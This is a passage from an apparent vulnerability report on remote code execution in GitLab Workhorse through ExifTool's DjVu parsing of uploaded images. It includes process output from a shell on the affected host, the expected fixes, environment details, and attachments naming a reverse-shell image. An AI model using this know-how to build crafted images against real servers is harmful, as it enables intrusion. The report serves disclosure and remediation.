root     32453  5.3  0.0 1774984 40780 ?       Sl    2020 13156:17 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr
git      32635 49.4  2.1 3154204 1401116 ?     Sl   12:09  31:54 puma: cluster worker 12: 7369 [gitlab-puma-worker]
git      32703 48.7  1.8 2402308 1195496 ?     Sl   13:08   3:01 puma: cluster worker 7: 7369 [gitlab-puma-worker]
exit
```


### Impact
* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file

### Examples
{F1257008}
{F1257009}

### What is the current *bug* behavior?
GitLab Workhorse will pass any file to ExifTool, greatly increasing the attack surface. The current bug is in the DjVu module of `ExifTool` which should ideally not ever be hit.

### What is the expected *correct* behavior?
* There must be better ways of convert C escape sequences than using `eval`
* Only the TIFF and JPEG modules should be used
* GitLab Workhorse could check if the file is a valid TIFF of JPEG before passing it to ExifTool

### Output of checks
This bug happens on GitLab.com

#### Results of GitLab environment info
```
System information
System:
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.10
Git Version:	2.29.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.10.2-ee
Revision:	cc4224220e6
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.6
URL:		http://192.168.0.127:9080
HTTP Clone URL:	http://192.168.0.127:9080/some-group/some-project.git
SSH Clone URL:	git@192.168.0.127:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	13.17.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file

## Attachments
- echo_vakzz.jpg.zip
- reverse_shell.jpg.zip
